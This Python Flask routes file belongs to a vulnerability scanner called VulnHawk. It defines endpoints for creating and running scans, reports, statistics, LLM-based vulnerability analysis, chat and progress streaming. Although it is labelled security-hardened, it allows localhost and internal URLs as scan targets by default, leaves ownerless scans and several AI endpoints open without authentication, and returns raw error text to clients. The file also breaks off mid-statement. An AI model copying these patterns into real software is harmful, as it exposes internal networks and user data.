"""
VulnHawk REST API Routes

Secure API endpoints for scanner functionality.
All sensitive endpoints require authentication and have rate limiting.
"""

import asyncio
import logging
from flask import request, jsonify, current_app, abort
from flask_login import login_required, current_user
from functools import wraps
import uuid

from app.api import api_bp
from app import db, limiter
from app.models import Scan, ScanStatus, Vulnerability

# Security logger
security_logger = logging.getLogger('security')


def check_scan_access(scan):
    """
    SECURITY: Check if current user has access to the scan.
    Prevents IDOR (Insecure Direct Object Reference) attacks.
    """
    # Allow access to scans without owner (anonymous scans)
    if scan.user_id is None:
        return True
    # Check if user owns the scan
    if current_user.is_authenticated and scan.user_id == current_user.id:
        return True
    # Admins can access all scans
    if current_user.is_authenticated and hasattr(current_user, 'is_admin') and current_user.is_admin:
        return True
    return False


def api_login_required(f):
    """
    Custom decorator that requires authentication via session or API key.
    Returns JSON error instead of redirect for API endpoints.
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not current_user.is_authenticated:
            return jsonify({'error': 'Authentication required', 'message': 'Please provide valid credentials or API key'}), 401
        return f(*args, **kwargs)
    return decorated_function


def async_route(f):
    """Decorator to run async functions in Flask routes."""
    @wraps(f)
    def wrapper(*args, **kwargs):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(f(*args, **kwargs))
        finally:
            loop.close()
    return wrapper


def validate_url(url, allow_localhost=True):
    """
    Validate and sanitize URL input.

    Args:
        url: The URL to validate
        allow_localhost: If True, allows localhost for testing (development mode)
    """
    if not url:
        return None, "URL is required"

    url = url.strip()

    # Add scheme if missing
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    # Basic validation
    from urllib.parse import urlparse
    try:
        parsed = urlparse(url)
        if not parsed.netloc:
            return None, "Invalid URL format"

        hostname = parsed.hostname.lower() if parsed.hostname else ''

        # In production, block localhost. In development, allow it for testing.
        if not allow_localhost:
            if hostname in ('localhost', '127.0.0.1', '0.0.0.0', '::1'):
                return None, "Scanning localhost is not allowed in production"

        return url, None

    except Exception as e:
        return None, f"Invalid URL: {str(e)}"


# ==================== Health Check ====================

@api_bp.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint."""
    return jsonify({
        'status': 'healthy',
        'version': current_app.config.get('APP_VERSION', '1.0.0')
    })


# ==================== Scan Endpoints ====================

@api_bp.route('/scans', methods=['POST'])
@api_login_required
@limiter.limit("10 per hour")
def create_scan():
    """
    Create a new scan. Requires authentication.

    Request body:
    {
        "url": "https://example.com",
        "config": {
            "max_depth": 5,
            "max_pages": 100,
            "scan_modules": ["xss", "sqli", "csrf"]
        }
    }
    """
    data = request.get_json()

    if not data:
        return jsonify({'error': 'Request body is required'}), 400

    # Validate URL
    url = data.get('url')
    validated_url, error = validate_url(url)

    if error:
        return jsonify({'error': error}), 400

    # Get optional config
    config = data.get('config', {})

    try:
        # SECURITY FIX: Always associate scan with authenticated user
        scan = Scan(
            target_url=validated_url,
            config=config,
            user_id=current_user.id
        )

        db.session.add(scan)
        db.session.commit()

        security_logger.info(f"Scan created via API: {scan.scan_id} by user {current_user.id}")

        return jsonify({
            'message': 'Scan created successfully',
            'scan_id': scan.scan_id,
            'status': scan.status.value
        }), 201

    except ValueError as e:
        # SECURITY FIX: Don't expose internal error details
        security_logger.warning(f"Scan creation validation error: {str(e)}")
        return jsonify({'error': 'Invalid scan configuration'}), 400
    except Exception as e:
        db.session.rollback()
        security_logger.error(f"Scan creation error: {str(e)}")
        return jsonify({'error': 'Failed to create scan'}), 500


@api_bp.route('/scans/<scan_id>', methods=['GET'])
@api_login_required
@limiter.limit("100 per hour")
def get_scan(scan_id):
    """Get scan details. Requires authentication and ownership."""
    scan = Scan.query.filter_by(scan_id=scan_id).first()

    if not scan:
        return jsonify({'error': 'Scan not found'}), 404

    # SECURITY FIX: Check ownership
    if not check_scan_access(scan):
        security_logger.warning(f"Unauthorized API scan access: {scan_id} by user {current_user.id}")
        return jsonify({'error': 'Access denied'}), 403

    return jsonify(scan.to_dict())


@api_bp.route('/scans/<scan_id>/start', methods=['POST'])
@api_login_required
@limiter.limit("5 per hour")
@async_route
async def start_scan(scan_id):
    """Start a pending scan. Requires authentication and ownership."""
    scan = Scan.query.filter_by(scan_id=scan_id).first()

    if not scan:
        return jsonify({'error': 'Scan not found'}), 404

    # SECURITY FIX: Check ownership
    if not check_scan_access(scan):
        security_logger.warning(f"Unauthorized API scan start: {scan_id} by user {current_user.id}")
        return jsonify({'error': 'Access denied'}), 403

    if scan.status != ScanStatus.PENDING:
        return jsonify({'error': f'Scan is already {scan.status.value}'}), 400

    try:
        # Import scanner
        from app.scanner.core.engine import ScannerEngine, ScanConfig

        # Create config
        scan_config_data = scan.config
        config = ScanConfig(
            max_depth=scan_config_data.get('max_depth', 5),
            max_pages=scan_config_data.get('max_pages', 100),
            timeout=scan_config_data.get('timeout', 30),
            delay=scan_config_data.get('delay', 0.5),
            concurrent_requests=scan_config_data.get('concurrent_requests', 10),
            scan_modules=scan_config_data.get('scan_modules', [
                'xss', 'sqli', 'csrf', 'headers', 'info_disclosure'
            ])
        )

        # Progress callback
        def on_progress(data):
            scan.update_progress(data['progress'], data.get('message'))

        # Vulnerability callback
        def on_vulnerability(vuln):
            try:
                v = Vulnerability(
                    scan_id=scan.id,
                    name=vuln.get('name', 'Unknown'),
                    vulnerability_type=vuln.get('type', 'unknown'),
                    url=vuln.get('url', ''),
                    description=vuln.get('description', ''),
                    severity=vuln.get('severity', 'medium'),
                    parameter=vuln.get('parameter'),
                    method=vuln.get('method', 'GET'),
                    payload=vuln.get('payload'),
                    evidence=vuln.get('evidence'),
                    cvss_vector=vuln.get('cvss', {}).get('vector'),
                    remediation=vuln.get('remediation')
                )
                db.session.add(v)
                db.session.commit()
            except Exception as e:
                current_app.logger.error(f"Error saving vulnerability: {e}")

        # Create scanner
        scanner = ScannerEngine(
            config=config,
            progress_callback=on_progress,
            vulnerability_callback=on_vulnerability
        )

        # Start scan
        scan.start()

        # Run scan
        results = await scanner.scan(scan.target_url)

        # Complete scan
        if results['status'] == 'completed':
            scan.complete()
        else:
            scan.fail(results.get('error', 'Unknown error'))

        return jsonify({
            'message': 'Scan completed',
            'results': scan.to_dict()
        })

    except Exception as e:
        scan.fail(str(e))
        return jsonify({'error': f'Scan failed: {str(e)}'}), 500


@api_bp.route('/scans/<scan_id>/cancel', methods=['POST'])
@api_login_required
@limiter.limit("10 per hour")
def cancel_scan(scan_id):
    """Cancel a running scan. Requires authentication and ownership."""
    scan = Scan.query.filter_by(scan_id=scan_id).first()

    if not scan:
        return jsonify({'error': 'Scan not found'}), 404

    # SECURITY FIX: Check ownership
    if not check_scan_access(scan):
        security_logger.warning(f"Unauthorized API scan cancel: {scan_id} by user {current_user.id}")
        return jsonify({'error': 'Access denied'}), 403

    if scan.status != ScanStatus.RUNNING:
        return jsonify({'error': 'Scan is not running'}), 400

    scan.cancel()
    security_logger.info(f"Scan cancelled via API: {scan_id} by user {current_user.id}")

    return jsonify({
        'message': 'Scan cancelled',
        'scan_id': scan.scan_id
    })


@api_bp.route('/scans/<scan_id>/vulnerabilities', methods=['GET'])
@api_login_required
@limiter.limit("50 per hour")
def get_scan_vulnerabilities(scan_id):
    """Get vulnerabilities for a scan. Requires authentication and ownership."""
    scan = Scan.query.filter_by(scan_id=scan_id).first()

    if not scan:
        return jsonify({'error': 'Scan not found'}), 404

    # SECURITY FIX: Check ownership
    if not check_scan_access(scan):
        security_logger.warning(f"Unauthorized API vuln access: {scan_id} by user {current_user.id}")
        return jsonify({'error': 'Access denied'}), 403

    # Pagination with limits
    page = request.args.get('page', 1, type=int)
    per_page = min(request.args.get('per_page', 20, type=int), 100)  # Max 100 per page

    # Filter by severity
    severity = request.args.get('severity')

    query = scan.vulnerabilities
    if severity:
        from app.models.vulnerability import Severity as SevEnum
        try:
            sev = SevEnum(severity.lower())
            query = query.filter_by(severity=sev)
        except ValueError:
            pass

    # Paginate
    pagination = query.paginate(page=page, per_page=per_page, error_out=False)

    return jsonify({
        'vulnerabilities': [v.to_dict() for v in pagination.items],
        'total': pagination.total,
        'page': page,
        'pages': pagination.pages,
        'has_next': pagination.has_next,
        'has_prev': pagination.has_prev
    })


@api_bp.route('/scans', methods=['GET'])
@api_login_required
@limiter.limit("100 per hour")
def list_scans():
    """List user's scans. Requires authentication."""
    page = request.args.get('page', 1, type=int)
    per_page = min(request.args.get('per_page', 10, type=int), 50)  # Max 50 per page

    # Filter by status
    status = request.args.get('status')

    # SECURITY FIX: Only show current user's scans (admins can see all)
    if current_user.is_admin:
        query = Scan.query.order_by(Scan.created_at.desc())
    else:
        query = Scan.query.filter_by(user_id=current_user.id).order_by(Scan.created_at.desc())

    if status:
        try:
            status_enum = ScanStatus(status.lower())
            query = query.filter_by(status=status_enum)
        except ValueError:
            pass

    pagination = query.paginate(page=page, per_page=per_page, error_out=False)

    return jsonify({
        'scans': [s.to_dict() for s in pagination.items],
        'total': pagination.total,
        'page': page,
        'pages': pagination.pages
    })


# ==================== Report Endpoints ====================

@api_bp.route('/scans/<scan_id>/report', methods=['GET'])
@api_login_required
@limiter.limit("20 per hour")
def get_scan_report(scan_id):
    """Generate scan report. Requires authentication and ownership."""
    scan = Scan.query.filter_by(scan_id=scan_id).first()

    if not scan:
        return jsonify({'error': 'Scan not found'}), 404

    # SECURITY FIX: Check ownership
    if not check_scan_access(scan):
        security_logger.warning(f"Unauthorized API report access: {scan_id} by user {current_user.id}")
        return jsonify({'error': 'Access denied'}), 403

    if scan.status != ScanStatus.COMPLETED:
        return jsonify({'error': 'Scan is not completed'}), 400

    report_format = request.args.get('format', 'json')

    if report_format == 'json':
        vulnerabilities = [v.to_dict() for v in scan.vulnerabilities.all()]

        report = {
            'scan': scan.to_dict(),
            'vulnerabilities': vulnerabilities,
            'summary': {
                'total_vulnerabilities': len(vulnerabilities),
                'by_severity': {
                    'critical': scan.critical_count,
                    'high': scan.high_count,
                    'medium': scan.medium_count,
                    'low': scan.low_count,
                    'info': scan.info_count
                },
                'risk_score': scan.risk_score,
                'risk_level': scan.risk_level
            }
        }

        return jsonify(report)

    elif report_format == 'html':
        # Generate HTML report
        from app.reports.html_report import generate_html_report
        html_content = generate_html_report(scan)
        return html_content, 200, {'Content-Type': 'text/html'}

    else:
        return jsonify({'error': 'Unsupported format. Use json or html'}), 400


# ==================== Statistics ====================

@api_bp.route('/stats', methods=['GET'])
@api_login_required
@limiter.limit("100 per hour")
def get_stats():
    """Get scanner statistics for current user."""
    # SECURITY FIX: Only show stats for current user's scans (admins see all)
    if current_user.is_admin:
        total_scans = Scan.query.count()
        completed_scans = Scan.query.filter_by(status=ScanStatus.COMPLETED).count()
        # Admin can see all vulnerabilities
        from app.models.vulnerability import Severity as SevEnum
        total_vulnerabilities = Vulnerability.query.count()
        critical_vulns = Vulnerability.query.filter_by(severity=SevEnum.CRITICAL).count()
        high_vulns = Vulnerability.query.filter_by(severity=SevEnum.HIGH).count()
    else:
        # Regular users only see their own stats
        user_scans = Scan.query.filter_by(user_id=current_user.id)
        total_scans = user_scans.count()
        completed_scans = user_scans.filter_by(status=ScanStatus.COMPLETED).count()

        # Get vulnerability counts for user's scans only
        from app.models.vulnerability import Severity as SevEnum
        user_scan_ids = [s.id for s in user_scans.all()]
        total_vulnerabilities = Vulnerability.query.filter(Vulnerability.scan_id.in_(user_scan_ids)).count() if user_scan_ids else 0
        critical_vulns = Vulnerability.query.filter(Vulnerability.scan_id.in_(user_scan_ids), Vulnerability.severity == SevEnum.CRITICAL).count() if user_scan_ids else 0
        high_vulns = Vulnerability.query.filter(Vulnerability.scan_id.in_(user_scan_ids), Vulnerability.severity == SevEnum.HIGH).count() if user_scan_ids else 0

    return jsonify({
        'total_scans': total_scans,
        'completed_scans': completed_scans,
        'total_vulnerabilities': total_vulnerabilities,
        'critical_vulnerabilities': critical_vulns,
        'high_vulnerabilities': high_vulns
    })


# ==================== AI Security Analysis ====================

@api_bp.route('/ai/analyze/vulnerability/<int:vuln_id>', methods=['GET'])
@limiter.limit("30 per hour")
def ai_analyze_vulnerability(vuln_id):
    """
    Get AI-powered analysis for a specific vulnerability.

    Returns comprehensive analysis including:
    - Executive summary
    - Technical details
    - Attack scenarios
    - Business impact assessment
    - Remediation steps with code examples
    - Compliance mapping

    Note: Allows access for anonymous scans (scans without user_id).
    """
    from app.ai.security_agent import create_security_agent

    vuln = Vulnerability.query.get_or_404(vuln_id)

    # Check if user has access to the scan
    # Allow access for anonymous scans or if user owns the scan
    if not check_scan_access(vuln.scan):
        user_id = current_user.id if current_user.is_authenticated else 'anonymous'
        security_logger.warning(f"Unauthorized AI analysis access: vuln {vuln_id} by user {user_id}")
        return jsonify({'error': 'Access denied'}), 403

    # Create AI agent and analyze
    agent = create_security_agent()

    vuln_data = {
        'id': str(vuln.id),
        'type': vuln.vulnerability_type,
        'severity': vuln.severity.value if hasattr(vuln.severity, 'value') else str(vuln.severity),
        'url': vuln.url,
        'parameter': vuln.parameter,
        'method': vuln.method,
        'payload': vuln.payload,
        'evidence': vuln.evidence,
        'description': vuln.description
    }

    analysis = agent.analyze_vulnerability(vuln_data)

    # Convert to JSON-serializable format
    return jsonify({
        'vulnerability_id': analysis.vulnerability_id,
        'vulnerability_type': analysis.vulnerability_type,
        'severity': analysis.severity,
        'cvss': {
            'score': analysis.cvss_score,
            'vector': analysis.cvss_vector
        },
        'executive_summary': analysis.executive_summary,
        'technical_details': analysis.technical_details,
        'attack_scenario': analysis.attack_scenario,
        'business_impact': analysis.business_impact,
        'threat_intelligence': {
            'cwe_ids': analysis.threat_intel.cwe_ids,
            'exploit_available': analysis.threat_intel.exploit_available,
            'exploit_maturity': analysis.threat_intel.exploit_maturity,
            'in_the_wild': analysis.threat_intel.in_the_wild,
            'ransomware_associated': analysis.threat_intel.ransomware_associated
        },
        'remediation': {
            'quick_fix': analysis.quick_fix,
            'steps': [
                {
                    'order': step.order,
                    'title': step.title,
                    'description': step.description,
                    'code_example': step.code_example,
                    'language': step.language,
                    'effort': step.effort
                }
                for step in analysis.remediation_steps
            ]
        },
        'compliance': {
            'owasp_category': analysis.owasp_category,
            'frameworks': analysis.compliance_frameworks
        },
        'risk_assessment': {
            'exploitability_score': analysis.exploitability_score,
            'impact_score': analysis.impact_score,
            'risk_rating': analysis.risk_rating
        },
        'confidence_score': analysis.confidence_score,
        'analysis_timestamp': analysis.analysis_timestamp
    })


@api_bp.route('/ai/analyze/scan/<scan_id>', methods=['GET'])
@limiter.limit("10 per hour")
def ai_analyze_scan(scan_id):
    """
    Get AI-powered comprehensive analysis for an entire scan.

    Returns:
    - Overall risk assessment
    - Executive summary
    - Prioritized remediation plan
    - Compliance impact analysis

    Note: Allows access for anonymous scans (scans without user_id).
    """
    from app.ai.security_agent import create_security_agent

    scan = Scan.query.filter_by(scan_id=scan_id).first_or_404()

    # Check access - allows anonymous scans or if user owns the scan
    if not check_scan_access(scan):
        user_id = current_user.id if current_user.is_authenticated else 'anonymous'
        security_logger.warning(f"Unauthorized AI scan analysis: {scan_id} by user {user_id}")
        return jsonify({'error': 'Access denied'}), 403

    if scan.status != ScanStatus.COMPLETED:
        return jsonify({'error': 'Scan must be completed for AI analysis'}), 400

    # Get all vulnerabilities
    vulnerabilities = scan.vulnerabilities.all()

    if not vulnerabilities:
        return jsonify({
            'message': 'No vulnerabilities found to analyze',
            'scan_id': scan_id,
            'risk_level': 'low'
        })

    # Convert to analysis format
    vuln_data = [
        {
            'id': str(v.id),
            'type': v.vulnerability_type,
            'severity': v.severity.value if hasattr(v.severity, 'value') else str(v.severity),
            'url': v.url,
            'parameter': v.parameter,
            'method': v.method,
            'payload': v.payload,
            'evidence': v.evidence
        }
        for v in vulnerabilities
    ]

    # Create AI agent and generate report
    agent = create_security_agent()
    report = agent.generate_report_summary(vuln_data)

    # Serialize highest risk findings
    high_risk_serialized = []
    for finding in report['highest_risk_findings']:
        high_risk_serialized.append({
            'vulnerability_id': finding.vulnerability_id,
            'type': finding.vulnerability_type,
            'severity': finding.severity,
            'cvss_score': finding.cvss_score,
            'quick_fix': finding.quick_fix
        })

    return jsonify({
        'scan_id': scan_id,
        'target_url': scan.target_url,
        'analysis': {
            'total_vulnerabilities': report['total_vulnerabilities'],
            'severity_breakdown': report['severity_breakdown'],
            'average_cvss_score': report['average_cvss_score'],
            'owasp_categories_affected': report['owasp_categories_affected'],
            'highest_risk_findings': high_risk_serialized,
            'remediation_priority': report['remediation_priority'],
            'executive_summary': report['executive_summary']
        },
        'generated_at': datetime.utcnow().isoformat()
    })


@api_bp.route('/ai/remediation/<vuln_type>', methods=['GET'])
@limiter.limit("50 per hour")
def ai_get_remediation(vuln_type):
    """
    Get AI-generated remediation guidance for a vulnerability type.

    This endpoint is public to help developers learn about security fixes.
    """
    from app.ai.security_agent import SecurityKnowledgeBase

    kb = SecurityKnowledgeBase()

    # Normalize vulnerability type
    vuln_type = vuln_type.lower().replace('-', '_').replace(' ', '_')

    if vuln_type not in kb.REMEDIATION_TEMPLATES:
        return jsonify({
            'error': 'Unknown vulnerability type',
            'available_types': list(kb.REMEDIATION_TEMPLATES.keys())
        }), 404

    template = kb.REMEDIATION_TEMPLATES[vuln_type]
    owasp_data = kb.OWASP_MAPPING.get(vuln_type, {})

    return jsonify({
        'vulnerability_type': vuln_type,
        'owasp_category': owasp_data.get('category', 'Unknown'),
        'description': owasp_data.get('description', ''),
        'cwe_references': owasp_data.get('cwe', []),
        'quick_fix': template.get('quick_fix', ''),
        'remediation_steps': [
            {
                'title': step.get('title', ''),
                'description': step.get('description', ''),
                'code_example': step.get('code', ''),
                'language': step.get('language', 'python')
            }
            for step in template.get('steps', [])
        ],
        'attack_scenario': kb.ATTACK_SCENARIOS.get(vuln_type, '')
    })


# Import datetime at module level for the new endpoints
from datetime import datetime


# ==================== Intelligent LLM-Powered AI Analysis ====================

@api_bp.route('/ai/intelligent/analyze/<int:vuln_id>', methods=['GET'])
@limiter.limit("20 per hour")
def ai_intelligent_analyze(vuln_id):
    """
    Get truly intelligent AI analysis using LLM (Claude/GPT-4).

    This endpoint uses advanced Chain-of-Thought reasoning and
    self-reflection to provide human-like security analysis.

    Features:
    - Dynamic, contextual analysis (not template-based)
    - Chain-of-Thought reasoning process
    - Self-reflection for quality improvement
    - Technology-stack aware remediation
    - Real attacker perspective

    Note: Requires ANTHROPIC_API_KEY or OPENAI_API_KEY environment variable
    for full LLM capabilities. Falls back to enhanced rule-based analysis otherwise.
    """
    try:
        from app.ai.llm_agent import create_intelligent_agent, AnalysisContext
    except ImportError as e:
        return jsonify({
            'error': 'Intelligent AI module not available',
            'message': str(e),
            'fallback': 'Use /ai/analyze/vulnerability/<id> for rule-based analysis'
        }), 503

    vuln = Vulnerability.query.get_or_404(vuln_id)

    # Check access
    if not check_scan_access(vuln.scan):
        user_id = current_user.id if current_user.is_authenticated else 'anonymous'
        security_logger.warning(f"Unauthorized intelligent AI access: vuln {vuln_id} by user {user_id}")
        return jsonify({'error': 'Access denied'}), 403

    # Create analysis context
    context = AnalysisContext(
        vulnerability_type=vuln.vulnerability_type,
        severity=vuln.severity.value if hasattr(vuln.severity, 'value') else str(vuln.severity),
        url=vuln.url,
        parameter=vuln.parameter,
        payload=vuln.payload,
        evidence=vuln.evidence,
        method=vuln.method
    )

    # Create intelligent agent and analyze
    agent = create_intelligent_agent(provider="auto")
    analysis = agent.analyze_vulnerability(context)

    # Format thinking process for transparency
    thinking_process = [
        {
            'step_type': step.step_type,
            'content': step.content,
            'confidence': step.confidence
        }
        for step in analysis.thinking_process
    ]

    return jsonify({
        'vulnerability_id': vuln_id,
        'model_used': analysis.model_used,
        'analysis_time_seconds': round(analysis.analysis_time, 2),
        'confidence_score': analysis.confidence_score,
        'thinking_process': thinking_process,
        'executive_summary': analysis.executive_summary,
        'technical_analysis': analysis.technical_analysis,
        'attack_narrative': analysis.attack_narrative,
        'business_impact': analysis.business_impact,
        'risk_assessment': analysis.risk_assessment,
        'remediation_plan': analysis.remediation_plan,
        'generated_at': datetime.utcnow().isoformat()
    })


@api_bp.route('/ai/intelligent/analyze/<int:vuln_id>/stream', methods=['GET'])
@limiter.limit("15 per hour")
def ai_intelligent_analyze_stream(vuln_id):
    """
    Stream intelligent AI analysis for better UX.

    Returns Server-Sent Events (SSE) stream of the analysis
    as it's generated by the LLM.
    """
    from flask import Response, stream_with_context

    try:
        from app.ai.llm_agent import create_intelligent_agent, AnalysisContext
    except ImportError as e:
        return jsonify({
            'error': 'Intelligent AI module not available',
            'message': str(e)
        }), 503

    vuln = Vulnerability.query.get_or_404(vuln_id)

    # Check access
    if not check_scan_access(vuln.scan):
        return jsonify({'error': 'Access denied'}), 403

    context = AnalysisContext(
        vulnerability_type=vuln.vulnerability_type,
        severity=vuln.severity.value if hasattr(vuln.severity, 'value') else str(vuln.severity),
        url=vuln.url,
        parameter=vuln.parameter,
        payload=vuln.payload,
        evidence=vuln.evidence,
        method=vuln.method
    )

    def generate():
        agent = create_intelligent_agent(provider="auto")
        for chunk in agent.analyze_vulnerability_stream(context):
            # Format as SSE
            yield f"data: {chunk}\n\n"
        yield "data: [DONE]\n\n"

    return Response(
        stream_with_context(generate()),
        mimetype='text/event-stream',
        headers={
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'X-Accel-Buffering': 'no'
        }
    )


# ==================== Real-Time Scan Progress Streaming ====================

@api_bp.route('/scans/<scan_id>/progress', methods=['GET'])
def scan_progress_stream(scan_id):
    """
    Real-time scan progress via Server-Sent Events (SSE).

    Streams progress updates including:
    - Progress percentage (0-100)
    - Current phase (crawling, passive_analysis, active_testing, etc.)
    - Elapsed time with human-readable format
    - Estimated remaining time with EMA smoothing
    - Current activity message
    - Statistics (URLs scanned, forms found, vulns detected)

    Client usage:
    ```javascript
    const eventSource = new EventSource('/api/v1/scans/<scan_id>/progress');
    eventSource.onmessage = (event) => {
        const data = JSON.parse(event.data);
        console.log(data.progress, data.timing);
    };
    ```
    """
    from flask import Response, stream_with_context
    import json
    import time

    scan = Scan.query.filter_by(scan_id=scan_id).first()

    if not scan:
        return jsonify({'error': 'Scan not found'}), 404

    # Allow access for anonymous scans or if user owns the scan
    if not check_scan_access(scan):
        return jsonify({'error': 'Access denied'}), 403

    def generate():
        """Generate SSE stream of progress updates."""
        last_progress = -1
        last_phase = None
        no_change_count = 0
        max_no_change = 30  # Stop after 30 seconds of no change when complete

        while True:
            # Re-query scan from database (refresh doesn't work in streaming context)
            current_scan = Scan.query.filter_by(scan_id=scan_id).first()
            if not current_scan:
                yield f"data: {json.dumps({'event': 'error', 'message': 'Scan not found'})}\n\n"
                break

            # Calculate elapsed time dynamically from started_at
            if current_scan.started_at:
                elapsed = (datetime.utcnow() - current_scan.started_at).total_seconds()
            else:
                elapsed = 0

            # Get remaining time from database (computed by scanner)
            remaining = current_scan.estimated_remaining_seconds or 0

            # Format times
            def format_duration(secs):
                if not secs or secs <= 0:
                    return "0s"
                secs = int(secs)
                hours = secs // 3600
                minutes = (secs % 3600) // 60
                seconds = secs % 60
                parts = []
                if hours > 0:
                    parts.append(f"{hours}h")
                if minutes > 0:
                    parts.append(f"{minutes}m")
                if seconds > 0 or not parts:
                    parts.append(f"{seconds}s")
                return " ".join(parts)

            progress_data = {
                'scan_id': current_scan.scan_id,
                'status': current_scan.status.value,
                'progress': current_scan.progress,
                'phase': current_scan.current_phase or 'pending',
                'message': current_scan.current_task or '',
                'timing': {
                    'elapsed_seconds': round(elapsed, 1),
                    'elapsed_formatted': format_duration(elapsed),
                    'remaining_seconds': round(remaining, 1),
                    'remaining_formatted': format_duration(remaining) if remaining > 0 else 'Calculating...',
                    'rate': round(current_scan.items_per_second_rate or 0, 2)
                },
                'stats': {
                    'urls_scanned': current_scan.urls_scanned,
                    'forms_found': current_scan.forms_found,
                    'parameters_tested': current_scan.parameters_tested,
                    'vulnerabilities': {
                        'critical': current_scan.critical_count,
                        'high': current_scan.high_count,
                        'medium': current_scan.medium_count,
                        'low': current_scan.low_count,
                        'info': current_scan.info_count,
                        'total': current_scan.total_vulnerabilities
                    }
                },
                'timestamp': datetime.utcnow().isoformat()
            }

            # Check for changes
            if current_scan.progress == last_progress and current_scan.current_phase == last_phase:
                no_change_count += 1
            else:
                no_change_count = 0
                last_progress = current_scan.progress
                last_phase = current_scan.current_phase

            # Send event
            yield f"data: {json.dumps(progress_data)}\n\n"

            # Stop conditions
            if current_scan.status in (ScanStatus.COMPLETED, ScanStatus.FAILED, ScanStatus.CANCELLED):
                # Send final status and close
                yield f"data: {json.dumps({'event': 'complete', 'status': current_scan.status.value})}\n\n"
                break

            if no_change_count > max_no_change:
                yield f"data: {json.dumps({'event': 'timeout', 'message': 'No progress updates'})}\n\n"
                break

            # Sleep before next update (1 second for real-time feel)
            time.sleep(1)

    return Response(
        stream_with_context(generate()),
        mimetype='text/event-stream',
        headers={
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'X-Accel-Buffering': 'no',
            'Access-Control-Allow-Origin': '*'
        }
    )


@api_bp.route('/scans/<scan_id>/progress/snapshot', methods=['GET'])
def scan_progress_snapshot(scan_id):
    """
    Get current scan progress as a single JSON response.

    Useful for polling or initial state before connecting to SSE stream.
    """
    scan = Scan.query.filter_by(scan_id=scan_id).first()

    if not scan:
        return jsonify({'error': 'Scan not found'}), 404

    if not check_scan_access(scan):
        return jsonify({'error': 'Access denied'}), 403

    # Calculate elapsed time
    elapsed = scan.elapsed_seconds or scan.duration

    return jsonify({
        'scan_id': scan.scan_id,
        'status': scan.status.value,
        'progress': scan.progress,
        'phase': scan.current_phase or 'pending',
        'message': scan.current_task or '',
        'timing': {
            'elapsed_seconds': round(elapsed, 1),
            'elapsed_formatted': scan._format_duration(elapsed),
            'remaining_seconds': round(scan.estimated_remaining_seconds or 0, 1),
            'remaining_formatted': scan._format_duration(scan.estimated_remaining_seconds or 0),
            'rate': round(scan.items_per_second_rate or 0, 2)
        },
        'stats': {
            'urls_scanned': scan.urls_scanned,
            'forms_found': scan.forms_found,
            'parameters_tested': scan.parameters_tested,
            'vulnerabilities': {
                'critical': scan.critical_count,
                'high': scan.high_count,
                'medium': scan.medium_count,
                'low': scan.low_count,
                'info': scan.info_count,
                'total': scan.total_vulnerabilities
            }
        },
        'timestamp': datetime.utcnow().isoformat()
    })


@api_bp.route('/ai/status', methods=['GET'])
def ai_status():
    """
    Check AI capabilities status.

    Returns information about available AI providers and features.
    The frontend uses this to show the correct AI provider badge.
    """
    import os

    status = {
        'available': False,
        'provider': None,
        'model': None,
        'rule_based_analysis': True,  # Always available as fallback
        'llm_powered_analysis': False,
        'available_providers': [],
        'recommended_action': None
    }

    # Check for OpenAI first (preferred for this use case)
    if os.environ.get('OPENAI_API_KEY'):
        status['available'] = True
        status['provider'] = 'openai'
        status['model'] = 'gpt-4o-mini'
        status['llm_powered_analysis'] = True
        status['available_providers'].append({
            'name': 'openai',
            'model': 'gpt-4o-mini',
            'features': ['security-focused', 'topic-restricted', 'optimized']
        })

    # Check for Anthropic as fallback
    if os.environ.get('ANTHROPIC_API_KEY'):
        status['available'] = True
        if not status['provider']:  # Only set if OpenAI not available
            status['provider'] = 'anthropic'
            status['model'] = 'claude-sonnet-4-20250514'
        status['llm_powered_analysis'] = True
        status['available_providers'].append({
            'name': 'anthropic',
            'model': 'claude-sonnet-4-20250514',
            'features': ['security-focused', 'topic-restricted', 'chain-of-thought']
        })

    if not status['available']:
        status['recommended_action'] = (
            "Set OPENAI_API_KEY environment variable to enable GPT-4o powered analysis. "
            "Get your API key from https://platform.openai.com/api-keys"
        )

    return jsonify(status)


# ==================== AI Chat Interface ====================

@api_bp.route('/ai/chat/<scan_id>', methods=['POST'])
@limiter.limit("60 per hour")
def ai_chat(scan_id):
    """
    Conversational AI chat endpoint for security analysis.

    Provides a ChatGPT-style interface for asking questions about
    vulnerabilities, remediation, business impact, and security best practices.

    Request body:
    {
        "message": "What should I fix first?",
        "history": [{"role": "user", "content": "..."}, ...],
        "scan_context": {...}
    }

    Returns:
    {
        "response": "AI analysis response...",
        "suggested_questions": ["Follow-up question 1", ...],
        "sources": ["vulnerability_id_1", ...]
    }
    """
    scan = Scan.query.filter_by(scan_id=scan_id).first_or_404()

    # Check access
    if not check_scan_access(scan):
        return jsonify({'error': 'Access denied'}), 403

    data = request.get_json()
    if not data or 'message' not in data:
        return jsonify({'error': 'Message is required'}), 400

    message = data.get('message', '').strip()
    history = data.get('history', [])
    scan_context = data.get('scan_context', {})

    if not message:
        return jsonify({'error': 'Message cannot be empty'}), 400

    # Get vulnerabilities for context
    vulnerabilities = scan.vulnerabilities.all()
    vuln_data = [
        {
            'id': v.id,
            'type': v.vulnerability_type,
            'severity': v.severity.value if hasattr(v.severity, 'value') else str(v.severity),
            'name': v.name,
            'url': v.url,
            'parameter': v.parameter,
            'description': v.description,
            'cvss_score': v.cvss_score,
            'owasp_category': v.owasp_category,
            'remediation': v.remediation
        }
        for v in vulnerabilities
    ]

    # Build context for AI
    context = {
        'scan_id': scan_id,
        'target': scan.target_url,
        'domain': scan.target_domain,
        'risk_score': scan.risk_score,
        'risk_level': scan.risk_level,
        'vulnerability_counts': {
            'critical': scan.critical_count,
            'high': scan.high_count,
            'medium': scan.medium_count,
            'low': scan.low_count,
            'info': scan.info_count,
            'total': len(vulnerabilities)
        },
        'vulnerabilities': vuln_data
    }

    # Try to use LLM-powered chat if available
    response_text = ""
    suggested_questions = []

    try:
        # Check if LLM is available
        import os
        if os.environ.get('ANTHROPIC_API_KEY') or os.environ.get('OPENAI_API_KEY'):
            response_text, suggested_questions = _llm_chat_response(message, history, context)
        else:
            # Fall back to rule-based responses
            response_text, suggested_questions = _rule_based_chat_response(message, context)
    except Exception as e:
